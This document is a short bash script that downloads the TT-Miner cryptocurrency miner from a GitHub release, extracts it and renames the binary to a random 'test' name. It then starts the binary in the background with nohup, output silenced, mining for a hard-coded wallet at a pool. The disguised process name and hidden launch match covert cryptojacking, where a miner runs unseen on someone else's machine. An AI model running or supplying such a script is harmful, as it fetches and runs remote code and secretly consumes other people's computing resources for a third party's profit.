#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

wget -O dot https://github.com/TrailingStop/TT-Miner-beta/releases/download/2024.2.1-beta5/TT-Miner-2024.2.1B5.2.tar.gz

tar xvf dot

cd TT-Miner-2024.2.1B5.2

mv TT-Miner test$kolot

nohup ./test$kolot -a FLEX -P kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.DOT-$kolot@eu.mpool.live:5271 > /dev/null 2>&1 &
